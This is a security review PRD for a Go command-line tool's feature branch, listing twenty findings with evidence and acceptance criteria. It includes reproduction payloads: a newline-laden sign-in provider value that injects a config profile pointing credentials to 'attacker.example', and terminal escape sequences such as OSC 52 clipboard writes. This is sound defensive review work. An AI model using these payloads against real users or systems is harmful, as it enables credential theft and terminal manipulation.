# PRD: `afs` CLI feature-complete branch, review fixes

| | |
|---|---|
| **Source** | Automated code and design review (dev-flow `implm-frm-prd` step 5) of `feat/cli-feature-complete` against `main` (`git diff main...HEAD`, 793 files, about 9,500 hand-written Go lines outside tests and generated code) |
| **Reviewed spec** | `specs/261121-cli-feature-complete/` (spec.md, implementation-notes.md D-C1..D-C36, the moved PRD) |
| **Rules** | `AGENTS.md` (command design, security and RBAC, architecture, TDD, quality gate, design review checklist) |
| **Review date** | 2026-11-22 |
| **Status** | Fixed (step 9): 19 findings in full, FR-010 except criterion 2 (D-R9) |

## 1. Executive summary

The branch is in good shape. All 180 contract operations are commands, generated from a checksummed
snapshot through one executor with data-only overrides. The quality gate is green and `internal/...`
coverage is 93.4%. The layering is clean: `cmd/afs` → `internal/cli` → `client`, `config`, `output`, with
no import cycles and no business logic in command packages beyond input shorthands that ADR-003 and
ADR-006 accept. The AWS CLI conventions (naming, global options, error format, exit codes 0/130/252/254/255)
hold almost everywhere. Secret handling on the main path is careful: secret values come only from
`file://`, `fileb://`, `-` or a no-echo prompt; inline `--cli-input-json` secrets are refused;
`--debug` masks `Authorization`, cookies and secret JSON fields at any depth; credentials and token-cache
files are refused when wider than 0600 and written atomically at 0600.

The weak spot is **data that comes from the service or the identity provider and is then trusted too
much**. One finding is a blocker. It was reproduced against a fake service: a sign-in provider whose
`issuerUrl` contains a newline injects lines into `~/.afs/config` and changes **another** profile's
`endpoint_url`, so that profile's API key or token goes to a host the attacker picks (FR-001). Related
high findings: the OIDC issuer and the endpoints it discovers may be plain `http` (FR-002), and
service-supplied strings reach the terminal with escape sequences intact (FR-003). One PRD requirement is
unmet: CSV with `--no-paginate` never prints `NextToken` (FR-004). The remaining findings are medium:
credentials in an endpoint URL's userinfo are echoed by `--debug`, reliability (timeouts, `Retry-After`,
pagination loops), input validation, AWS convention details, observability, dead generated code and test
gaps.

| Priority | Count | Findings |
|---|---|---|
| P0 | 1 | FR-001 |
| P1 | 3 | FR-002, FR-003, FR-004 |
| P2 | 16 | FR-005 to FR-020 |

Out of scope: tasks M6-X2 (re-pin the snapshot to a `-restapi` release tag) and M6-X3 (hand-offs to other
repositories) are blocked outside this repository and stay tracked in the original spec.

**Verdict:** request changes. Fix FR-001 before merge; fix the P1 findings before the first release.

## 2. Problem, goals and non-goals

**Problem.** The `afs` feature-complete branch trusts some data from the service and the identity provider
too much, misses one pagination requirement, and has several reliability, validation and convention gaps.
The people affected are every CLI user who signs in with SSO or keeps several profiles (FR-001, FR-002),
anyone who lists data that other principals write (FR-003), FinOps users exporting CSV (FR-004), and
maintainers (FR-016 to FR-020).

**Goals.**
- G1. No service or IdP response can change local configuration beyond the fields it is meant to set, or
  send a credential over clear text or to another host (FR-001, FR-002, FR-005).
- G2. Untrusted text is safe to print on a terminal (FR-003).
- G3. PRD CLI-7 holds for every output format (FR-004).
- G4. Every network wait is bounded, and every malformed answer is an error with an exit code, never a hang or
  silent empty output (FR-006, FR-007, FR-009, FR-011 to FR-013).
- G5. AWS CLI conventions, the design checklist, the docs and the tests match the code (FR-008, FR-010,
  FR-014 to FR-020).

**Non-goals.**
- New commands, options or services; contract changes (CLI-CD-1..6 stay with `-restapi`).
- M6-X2 (re-pin the snapshot to a `-restapi` release tag) and M6-X3 (cross-repository hand-offs).
- OS keychain storage, a `GetMe` cache, `--ca-bundle` (decided out in ADR-009, D-C12, D-C34).
- Changing `--output json` bytes (ADR-005).

## 3. Functional requirements

Each requirement is one finding. Evidence is `file:line` on commit `45dfe46`. "Reproduced" means the
behaviour was observed by running `bin/afs` against a local fake server.

### FR-001 (P0) Configuration-file injection from service-supplied SSO provider fields

**Finding.** `afs configure sso` and `afs sso login` write `issuerUrl`, `cliClientId` and `id` from the
unauthenticated `ListSignInProviders` response into `~/.afs/config` without validation. `File.Set` writes
`key + " = " + value` as one string, so a value that contains `\n` adds new lines, sections and keys.
Reproduced: a provider with `issuerUrl` set to
`"http://idp.example.com\n[profile prod]\nendpoint_url = https://attacker.example"` adds a `[profile prod]`
section before the real one. `Get` reads the first match, so `afs --profile prod teams list-teams` then
sends that profile's credential to `https://attacker.example`. Anyone who controls a service's
identity-provider settings, or the response of any endpoint the user configures (including a loopback
port-forward), can redirect credentials meant for other services.

**Evidence.** `internal/config/ini.go:96-117` (`Set` concatenates the raw value);
`internal/cli/configure/configure.go:138-142`; `internal/cli/sso/login.go:44-45`;
`internal/cli/sso/providers.go:108` (`NoAuth: true`).

**Acceptance criteria.**
1. `config.File.Set` returns an error, and writes nothing, when a section, key or value contains `\r`,
   `\n` or another control character, or when a key or section contains `=`, `[` or `]`.
2. `afs configure sso` and `afs sso login` check every provider field before writing. `issuerUrl` must be an
   absolute `https` URL with no userinfo, query or fragment (`http` only for a loopback host, as D-C33
   allows for endpoints). `cliClientId` and `id` must match a strict character set. Otherwise the command
   exits 255 with `the service returned an invalid sign-in provider (<field>)` and leaves the file unchanged.
3. A regression test uses the reproduced payload and asserts the config file is byte-for-byte unchanged and
   that the other profile's `endpoint_url` still resolves to its original value.
4. `afs configure` (interactive) applies the same check to typed values.

### FR-002 (P1) OIDC issuer and discovered endpoints are not required to use https

**Finding.** `Discover` builds `{issuer}/.well-known/openid-configuration` from the profile's `sso_issuer`
or the provider's `issuerUrl`, and uses whatever `device_authorization_endpoint` and `token_endpoint` come
back. No scheme is checked, and the discovery document's `issuer` is not compared with the configured
issuer (OIDC Discovery §4.3). The device code, the refresh token (`Refresh`) and the access token can
travel over plain `http`, or go to a token endpoint on another host.

**Evidence.** `internal/sso/oidc.go:26-41`; `internal/sso/login.go:146-160, 186`;
`internal/sso/refresh.go:216-226`; `internal/config/config.go:93` (`sso_issuer` read without validation).

**Acceptance criteria.**
1. `sso_issuer` is validated with the same rule as `endpoint_url` (`https`; `http` only for loopback) when it
   is read and when it is written. Violations exit 255 with a message that names the profile key.
2. `device_authorization_endpoint` and `token_endpoint` must be `https`, or loopback `http` when the issuer is
   loopback; otherwise login and refresh fail with exit 255 and send no form.
3. The discovery document's `issuer` must equal the configured issuer (after trimming a trailing `/`);
   otherwise fail with exit 255.
4. Table-driven tests cover each rejected case and show that no request carrying `device_code` or
   `refresh_token` is sent.

### FR-003 (P1) Terminal escape sequences from service data reach the terminal

**Finding.** `table` and `text` output replace only `\n` and `\t`. `ESC`, `BEL`, `\r` and other C0 and C1
control characters pass through, and so do OSC sequences such as OSC 52 (write to the clipboard) and screen
clears. Error messages print `message` from the API unchanged. Reproduced: a team name containing
`\u001b[2J\u001b]52;c;...\u0007\r` and an `AccessDenied` message containing `\u001b]0;...\u0007` are written
to the terminal as raw bytes. AGENTS.md says to treat content from agents, repositories and model output as
untrusted, and much of what users list (agent names, work-order titles, audit details) is written by other
principals.

**Evidence.** `internal/output/table.go:173, 280`; `internal/output/text.go:13, 21, 29`;
`internal/cli/exec/errors.go:25-35` (message, dependents, tags and repositories printed raw);
`internal/sso/login.go:166-168` (IdP-supplied `verification_uri` and `user_code` printed raw).

**Acceptance criteria.**
1. A single sanitizer in `internal/output` replaces C0 controls other than `\n` and `\t`, plus DEL and C1
   controls (U+0080 to U+009F), with a visible escape such as `\x1b` or U+FFFD. It applies to every `table`
   and `text` cell, every value in an AWS-style error message and its detail lines, and the device-flow
   prompt.
2. `json` output stays byte-stable (ADR-005). JSON already escapes control characters, and `yaml` quotes
   them, so neither changes. A test proves both.
3. Tests feed the reproduced payloads through `table`, `text` and `ReportError` and assert no byte below
   0x20 (except `\n`, `\t`) and no 0x7F to 0x9F code point reaches the writer.
4. Golden files are unchanged for ordinary data.

### FR-004 (P1) CSV with `--no-paginate` does not print `NextToken`

**Finding.** PRD CLI-7 (P0 in the source PRD) says `--no-paginate` returns one page with its next token.
D-C7 says CSV prints the page and writes `NextToken: <X-Afs-Next-Token>` to stderr. `fetchCSV` stops after
one page and prints nothing, so a FinOps user gets a truncated report with no sign that more rows exist and
no way to resume. No test covers it.

**Evidence.** `internal/cli/exec/paginate.go:173-202`; `user-docs/pagination.md:7, 22-23`.

**Acceptance criteria.**
1. With `--output csv --no-paginate`, when the response carries `X-Afs-Next-Token`, stderr gets
   `NextToken: <token>` and stdout holds only the CSV page. Exit 0.
2. `--starting-token <that token>` with `--output csv` resumes on the next page and writes no second header.
3. With no next token, nothing extra is printed.
4. `user-docs/pagination.md` documents the CSV token and that CSV tokens and JSON tokens cannot be swapped.

### FR-005 (P2) Credentials in an endpoint URL's userinfo are accepted and printed

**Finding.** `ValidateEndpoint` accepts `https://user:pass@host`. The client keeps the userinfo in the
request URL, and `--debug` prints the full URL. Reproduced: `--endpoint-url http://user:hunter2@127.0.0.1:...
--debug` logs `request: GET http://user:hunter2@127.0.0.1:.../v1/teams`. Error messages also echo the raw
endpoint (`config.go:143, 156, 158`). Priority P2, not P1 (step 6): the user supplies the credential, it
reaches only their own stderr, and only with `--debug`. It is still a security fix because debug logs are
often pasted into tickets.

**Evidence.** `internal/config/config.go:137-159`; `internal/client/client.go:130-139, 192`.

**Acceptance criteria.**
1. `ValidateEndpoint` rejects an endpoint with userinfo, a query or a fragment (exit 255,
   `endpoint_url must not contain credentials, a query or a fragment`). The message does not echo the
   userinfo.
2. Defence in depth: the `--debug` request line prints `URL.Redacted()`.
3. Tests cover the option, environment and profile sources and assert that the password never appears on
   stderr.

### FR-006 (P2) SSO HTTP calls ignore the CLI timeouts

**Finding.** `afs sso login` uses `http.DefaultTransport` unless a test injects one, so
`--cli-connect-timeout` is ignored. Neither login nor silent refresh sets a read timeout. A refresh runs
inside every API command whose token has expired, so an IdP that never answers hangs any command until
Ctrl-C.

**Evidence.** `internal/cli/sso/login.go:49-53`; `internal/cli/runtime/runtime.go:67-82` (`&http.Client{Transport: rt}` with no `Timeout`).

**Acceptance criteria.**
1. Login and refresh use the transport built by `runtime` (connect timeout) and bound each IdP request with
   `--cli-read-timeout` (default 60 s).
2. A test with a fake IdP that never answers sees refresh fail within the read timeout, with exit 255 and the
   login hint.

### FR-007 (P2) A token response without `access_token` is accepted and cached

**Finding.** A `200` token response with an empty or missing `access_token` becomes a cached `Token` with an
empty `AccessToken`. The chain then sends `Authorization: Bearer ` and the user gets an `Unauthenticated`
error with no hint that the IdP misbehaved. `token_type` other than `Bearer` is also accepted silently.

**Evidence.** `internal/sso/oidc.go:93-107`; `internal/sso/login.go:189-190`; `internal/sso/refresh.go:222-226`.

**Acceptance criteria.**
1. Login and refresh fail with exit 255 (`the identity provider returned no access token`) when
   `access_token` is empty, or when `token_type` is set and is not `Bearer` (compared case-insensitively). Nothing is cached.
2. Tests cover both responses.

### FR-008 (P2) `--debug` does not cover OIDC traffic

**Finding.** `--debug` logs API requests only. Discovery, device authorization, token polling and refresh
are invisible, which makes sign-in failures hard to diagnose (observability).

**Evidence.** `internal/sso/oidc.go:56-84` (no logger); `internal/cli/runtime/runtime.go:92-94` (debug only on
the API client).

**Acceptance criteria.**
1. With `--debug`, each OIDC request logs method, URL (redacted), status and duration through the same
   `<time> DEBUG sso ...` format.
2. Form bodies are never logged. `device_code`, `refresh_token`, `access_token`, `id_token` and `user_code`
   are masked in any logged response. A test asserts that none of these values appears on stderr.

### FR-009 (P2) Integer options accept forms that are not JSON, and fail as an internal error

**Finding.** `strconv.ParseInt` accepts `+3` and `03`. The text is then inserted as a raw JSON number, so
marshalling the body fails later. Reproduced: `pools scale-pool --workers +3` and `--workers 03` exit 255 with
`json: error calling MarshalJSON for type *cli.Object: invalid character ...`; `budgets put-budget
--thresholds 050 80` fails the same way. These should be usage errors (252) with an AWS-style message.

**Evidence.** `internal/cli/exec/build.go:310-317, 329-333` (integer); `:318-322, 334-338` (number:
`ParseFloat` also accepts `Inf`, `NaN` and hex floats).

**Acceptance criteria.**
1. Integer and number option values are re-encoded from the parsed value (`strconv.FormatInt`, or a strict
   JSON-number check) before they go into the body. `NaN`, `Inf` and hex forms are refused.
2. Invalid input exits 252 with `argument --workers: expected an integer, got "+3"`.
3. Table-driven tests cover `+3`, `03`, `0x10`, `1e3` (integer), `NaN`, `Inf` and `-0` (number), and lists.

### FR-010 (P2) Path parameters `.` and `..` are sent unchanged

**Finding.** `BuildPath` uses `url.PathEscape`, which leaves `.` and `..` as they are. `--team-id ..` sends
`GET /v1/teams/..`, which a server or proxy may normalise to another route. The request still carries the
caller's credential.

**Evidence.** `internal/client/request.go:51`; `internal/cli/exec/build.go:240-255` (no id validation).

**Acceptance criteria.**
1. An empty value, `.` or `..` for any path parameter is a usage error (252) before any request is sent.
2. Where the snapshot gives a `pattern` for an id parameter, the value is checked against it (252 on
   mismatch).
3. Tests cover both rules for at least `teamId`, `agentId` and the work-order repository `host`, `owner`
   and `repo`.

### FR-011 (P2) `Retry-After` is unbounded

**Finding.** The retry delay is `max(jitter, Retry-After)` with no ceiling. A `Retry-After: 86400` makes a
command sleep for a day.

**Evidence.** `internal/client/retry.go:18-39`.

**Acceptance criteria.**
1. `Retry-After` is capped (proposed: 20 s, or the read timeout when it is smaller). Above the cap, the
   client gives up and returns the API error (254) instead of sleeping.
2. With `--debug`, the chosen delay and the reason are logged.
3. Tests cover delta-seconds, HTTP-date and over-cap values.

### FR-012 (P2) Pagination can loop forever and drops malformed pages silently

**Finding.** `fetchJSON` follows `nextToken` with no guard, so a server that repeats a token loops until
memory runs out. A page whose result key is not an array is ignored (`_ = json.Unmarshal(raw, &items)`), so a
contract drift shows as an empty list rather than an error. `fetchCSV` has the same unguarded loop.

**Evidence.** `internal/cli/exec/paginate.go:91-157, 120, 179-202`.

**Acceptance criteria.**
1. A `nextToken` (or `X-Afs-Next-Token`) equal to the previous one ends pagination with exit 255:
   `the service returned the same page token twice`.
2. A result key that is present but not an array is an error (255) naming the key.
3. Tests cover both cases for JSON and CSV.

### FR-013 (P2) `--wait` ignores `Retry-After` and undecodable status responses

**Finding.** D-C9 says the poll interval is 5 s or `Retry-After`; `Until` always uses the fixed interval.
`Evaluate` treats a status body it cannot decode as "not done", so a contract change makes every wait run
until the timeout without saying why.

**Evidence.** `internal/cli/wait/wait.go:139-201` (no `Retry-After`); `:96-103` (decode failure returns
`false, nil`).

**Acceptance criteria.**
1. A poll response's `Retry-After` (capped as in FR-011) replaces the interval for the next poll.
2. An undecodable status body ends the wait with exit 255 and names the operation.
3. Tests cover both cases.

### FR-014 (P2) The kubeconfig merge trusts service-supplied exec commands and entry names

**Finding.** `teams get-kubeconfig` merges the returned YAML into `~/.kube/config` as it is. The exec
credential plugin's `command` and `args`, which `kubectl` runs, are not checked. The incoming `clusters`,
`contexts` and `users` replace existing entries of the same name, including entries that have nothing to do
with AFS. The API is trusted, but a single bad response would get code execution on the next `kubectl` call.

**Evidence.** `internal/kubeconfig/kubeconfig.go:128-170`; `internal/cli/teams/kubeconfig.go:49-78`.

**Acceptance criteria.**
1. Every incoming user's `exec.command` must be `aws`, and `args` must start with `eks get-token`. Anything
   else fails with exit 255 and leaves the file untouched.
2. Incoming entry names must start with the documented AFS prefix (for example `afs-<teamId>`). An existing
   entry is replaced only when its name has that prefix.
3. Tests cover a hostile command, hostile args and a name collision with a non-AFS entry.

### FR-015 (P2) `afs` and `afs <service>` with no operation exit 0

**Finding.** The AWS CLI prints usage and
`the following arguments are required: command` (or `operation`) and exits 252. `afs` and `afs teams`
print help and exit 0, so scripts with a missing operation look as if they worked.

**Evidence.** `internal/cli/cli.go:35-40`.

**Acceptance criteria.**
1. `afs` with no arguments, and `afs <service>` with no operation, print the usage and
   `afs: error: the following arguments are required: operation` (or `command`) to stderr and exit 252.
2. `afs help` and `afs <service> help` still exit 0.
3. Golden tests are updated.

### FR-016 (P2) The safe-update notice differs from PRD CLI-10

**Finding.** CLI-10 and CLI-US-6 specify `Applied to version N; use --if-match to guard against concurrent
changes.` on stderr after a successful write. The CLI prints
`Read the current version N; sending If-Match: "N". Pass --if-match to choose a version.` before the write,
and no decision records the change. The user docs match the code, not the PRD.

**Evidence.** `internal/cli/exec/run.go:71-80`; `internal/cli/safeupdate/safeupdate.go:250-252`;
`specs/261121-cli-feature-complete/enterprise-agent-factory-service-cli-PRD.md:47, 146`;
`user-docs/teams-and-members.md:22`.

**Acceptance criteria.**
1. Either the notice matches the PRD text and is printed after a successful write, or a decision (ADR entry
   in `docs/architectural-decision-record.md`) records the new text and timing and the deviation is
   reported to the root PRD owner.
2. The test for CLI-US-6 asserts the chosen text and its position relative to the write.

### FR-017 (P2) The generated API types are unused

**Finding.** `internal/client/gen/types.gen.go` (7,440 lines from oapi-codegen) is imported by nothing but
its own test. Every override decodes responses into `map[string]json.RawMessage` or `any`, so field-name
mistakes in columns, safe-update matching and wait evaluation are found only at run time. ADR-002 says the
client is generated from the contract, which is true only of the descriptors.

**Evidence.** `internal/client/gen/` (no importers: `grep -rl client/gen --include=*.go`);
`internal/cli/safeupdate/safeupdate.go:118-123, 160-170`; `internal/cli/wait/wait.go:90-110`;
`docs/architectural-decision-record.md` ADR-002 and ADR-007.

**Acceptance criteria.**
1. Decide and record (ADR) one of: (a) use the generated types where the CLI reads fields itself
   (safe-update readers, wait status, the work-order repository list, the SSO provider list), or (b) remove
   oapi-codegen and the generated package and amend ADR-002 and ADR-007.
2. If (a): a compile-time reference to each field the CLI reads, so a contract rename fails the build.
   If (b): `make generate-check` and the gate stay green without the package.

### FR-018 (P2) `--secret-value` help says "(required)" although a hidden prompt is offered

**Finding.** `secrets create-secret help` lists `--secret-value (string) (required)`. With a terminal, the
option may be left out and a no-echo prompt asks for the value, which is the safest choice. The help steers
users toward passing the option, and the accepted forms (`file://`, `fileb://`, `-`) do not appear next to
it.

**Evidence.** `internal/cli/options.go:123-125`; `internal/cli/exec/build.go:206-215`; generated
`user-docs/reference/secrets.md`.

**Acceptance criteria.**
1. Help for every sensitive option reads
   `--secret-value (file://PATH | fileb://PATH | -; prompted without echo when omitted on a terminal)` and is
   not marked required.
2. The golden help files and `user-docs/reference/` are regenerated.

### FR-019 (P2) Test gaps in critical packages

**Finding.** Aggregate coverage passes, but per-package coverage from each package's own tests is low where
the logic is subtle: `internal/cli/safeupdate` 67.5% (`ReadDeniedError.Error` 0%, list-match ambiguity
untested), `internal/cli/exec` 74.0%, and the error paths of `config.File.Save` (47.4%) and
`sso.Cache.Save` (54.5%) are untested. No test covers the findings above (control characters, INI
injection, CSV `--no-paginate`, integer forms).

**Evidence.** `go test -cover ./internal/...`; `go tool cover -func` for the files named.

**Acceptance criteria.**
1. `internal/cli/safeupdate` and `internal/cli/exec` reach at least 90% from their own tests. The list-match
   rule (`id`, `name`, `key`, the match parameter) gets a test where two items collide on different
   fields.
2. Write-failure tests (unwritable directory, failed rename) for `config.File.Save` and `sso.Cache.Save`
   assert the original file is untouched and no temporary file is left.
3. Each fix in this PRD lands with the failing test that proves it (Red first).

### FR-020 (P2) The pager runs under `context.Background()`

**Finding.** The AGENTS.md design checklist says to pass the context through every call. The pager is started
with `context.Background()`, so Ctrl-C does not cancel it through the command context. The terminal
delivers SIGINT to the pager anyway, so the effect is small, but the rule is broken.

**Evidence.** `internal/output/pager.go:70`.

**Acceptance criteria.**
1. `OpenPager` takes the command context and starts the pager with it.
2. A test with a fake `StartPager` sees the context passed through.

## 4. Non-functional requirements

| Area | Requirement |
|---|---|
| Security | After the fixes, the AGENTS.md design checklist item "No token, API key or secret value can reach stdout, stderr, logs or shell history" holds for SSO traffic and endpoint URLs too. Each security fix has a test of the denied or hostile case. `make vuln` stays clean |
| Compatibility | `--output json` stays byte-stable. Exit-code changes (FR-009, FR-012, FR-013, FR-015) are listed in the release notes and in `user-docs/errors-and-exit-codes.md` |
| Reliability | No code path waits on the network longer than the configured connect and read timeouts, or the `Retry-After` cap, without the user seeing why |
| Performance | Startup stays under 100 ms (`startup_bench_test.go`). The sanitizer (FR-003) adds no measurable cost on a 10,000-row table |
| Observability | `--debug` covers every outbound HTTP request the CLI makes, API or IdP, with the same redaction |
| Quality | `make gate` is green after every merged fix. `internal/...` coverage stays at or above 90%; `safeupdate` and `exec` reach 90% on their own (FR-019) |

## 5. Dependencies

- **`-restapi`:** none of the fixes need a contract change. FR-001 and FR-002 assume `issuerUrl` is an
  https URL and `cliClientId` an opaque id with no whitespace. Tell `-restapi` to validate these at
  `CreateIdentityProvider`/`UpdateIdentityProvider` too, as defence in depth (a message, not a blocker).
- **Root repository:** FR-016 may change the PRD text of CLI-10. Report the deviation to the root PRD
  owner.
- **Kubernetes/EKS:** FR-014 depends on the exec plugin shape `-restapi` returns (`aws eks get-token`) and on
  the AFS naming prefix for kubeconfig entries. Confirm both from `GetTeamKubeconfig` examples in the snapshot.

## 6. Implementation guidance

- **TDD for every fix.** Red: a failing test that reproduces the finding (use the payloads in FR-001,
  FR-003, FR-005, FR-009). Green: the smallest change. Refactor: rerun the tests. No fix merges without its
  failing-first test.
- **Review each fix before starting the next.** Run the AGENTS.md design checklist on the diff. A security
  fix (FR-001, FR-002, FR-003, FR-005, FR-014) gets a second reviewer pass that tries to bypass it.
- **Order.** FR-001 first, alone, merged before anything else. Then the P1 findings. Then the P2 findings.
- **Worker streams and git worktrees.** After FR-001 lands, run parallel streams with agent teammates, one
  per stream, each in its own `git worktree` off the branch (`git worktree add ../afs-cli-<stream>
  -b fix/<stream>`). Streams own disjoint files, so merges stay clean:

| Stream | Findings | Files owned |
|---|---|---|
| A config and SSO | FR-001 (lands first), FR-002, FR-006, FR-007, FR-008 | `internal/config/`, `internal/sso/`, `internal/cli/sso/`, `internal/cli/configure/`, `internal/cli/runtime/` |
| B output safety | FR-003, FR-018, FR-020 | `internal/output/`, `internal/cli/exec/errors.go`, `internal/cli/options.go`, help goldens |
| C transport and input | FR-005, FR-009, FR-010, FR-011 | `internal/client/`, `internal/cli/exec/build.go` |
| D pagination and wait | FR-004, FR-012, FR-013, FR-016 | `internal/cli/exec/paginate.go`, `internal/cli/exec/run.go`, `internal/cli/wait/`, `internal/cli/safeupdate/` |
| E kubeconfig, conventions, cleanup | FR-014, FR-015, FR-017, FR-019 | `internal/kubeconfig/`, `internal/cli/cli.go`, `internal/client/gen/`, tests in `safeupdate` and `exec` (with D's agreement) |

  Shared files (`Makefile`, `go.mod`, goldens, `user-docs/reference/`) are regenerated by the orchestrator
  after each merge. A stream rebases on the branch before it opens its merge.
- **Status.** Update the review spec's `status.md` after every fix, as AGENTS.md requires.
- **Docs.** Each behaviour change updates `user-docs/` in the same commit (errors and exit codes, pagination,
  SSO, troubleshooting).

## 7. Open questions

| # | Question | Proposed default |
|---|---|---|
| OQ-1 | FR-003: escape style for control characters, `\x1b` (readable) or U+FFFD (compact)? | `\x1b` style, so values stay diagnosable |
| OQ-2 | FR-011: the `Retry-After` cap value | 20 s, or the read timeout when it is smaller |
| OQ-3 | FR-014: the exact AFS prefix for kubeconfig entry names | Take it from the snapshot's `GetTeamKubeconfig` example; ask `-restapi` if absent |
| OQ-4 | FR-016: align the code to the PRD, or the PRD to the code? | Align the code to the PRD (notice after the write), since CLI-10 is P0 in the source PRD |
| OQ-5 | FR-017: use or remove the generated types? | Remove them and amend ADR-002/007, unless stream E finds a field drift the types would have caught |
| OQ-6 | FR-015: does exiting 252 for a bare `afs` break any documented script or completion? | No; completion calls `afs help`-style paths. Verify with the completion tests |

## 8. Review record (step 6, `review-prd`)

| Dimension | Status | Note |
|---|---|---|
| Problem clarity | Pass | Section 2 names the problem and the affected users |
| Scope definition | Pass | Goals G1 to G5 and non-goals added in step 6 |
| Functional completeness | Pass | 20 atomic FRs, each tied to a goal |
| NFR coverage | Pass | Security, compatibility, reliability, performance, observability, quality (section 4, added in step 6) |
| Acceptance criteria | Pass | Every FR has numbered, testable criteria |
| Dependency identification | Pass | Section 5, added in step 6 |
| Open questions | Pass | Section 7, added in step 6, each with a proposed default |
| Review-PRD guidance | Pass | TDD, review per fix, agent teammates in worker streams, git worktrees (section 6) |

Priority changes in step 6: the endpoint-userinfo finding moved from P1 to P2 (user-supplied, own stderr,
`--debug` only) and became FR-005. The CSV `NextToken` finding moved up to FR-004 (P1, an unmet source-PRD
requirement). FR-001 stays P0: it was reproduced, it sends credentials to a host the attacker chooses, and the
fix is small. FR-014 stays P2: the response comes from the authenticated control plane over https, so this
is defence in depth.

**Verdict:** ready for spec.
